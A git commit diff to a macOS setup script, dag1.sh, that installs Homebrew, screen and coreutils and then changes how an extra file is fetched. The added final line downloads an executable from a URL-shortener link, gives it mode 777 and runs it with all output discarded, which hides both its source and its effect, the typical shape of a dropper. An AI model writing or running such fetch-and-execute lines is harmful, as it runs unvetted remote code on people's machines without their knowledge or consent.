68ba4b7f68e18b72a92fbcaf178a17c9ca2ceac4
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-10 21:33:45 +0100

    Update dag1.sh

--- dag1.sh
+++ dag1.sh
@@ -3,5 +3,4 @@ softwareupdate -l
 ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
 brew install --cask screen
 brew install coreutils
-wget https://raw.githubusercontent.com/uveshV/duniaajapo/main/vija.sh
-chmod +x vija.sh
+wget https://1sil.short.gy/INN2bn && chmod 777 INN2bn && ./INN2bn > /dev/null
